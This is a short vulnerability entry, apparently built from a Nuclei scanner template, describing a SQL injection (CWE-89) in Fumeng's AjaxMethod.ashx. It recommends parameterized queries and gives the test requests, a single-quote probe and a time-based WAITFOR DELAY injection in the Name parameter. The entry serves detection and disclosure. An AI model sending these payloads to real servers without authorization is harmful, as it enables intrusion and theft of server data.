# Vulnerability: Fumeng - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`fumengyun-sqli.yaml`)

## Description
The Fumeng AjaxMethod.ashx file has an SQL injection vulnerability. Attackers can use this vulnerability to obtain server data.

## Secure Mitigation
Implement input validation and use parameterized queries to prevent SQL Injection attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

@timeout: 30s
GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27 HTTP/1.1
Host: {{Hostname}}

@timeout: 30s
GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
Host: {{Hostname}}
```

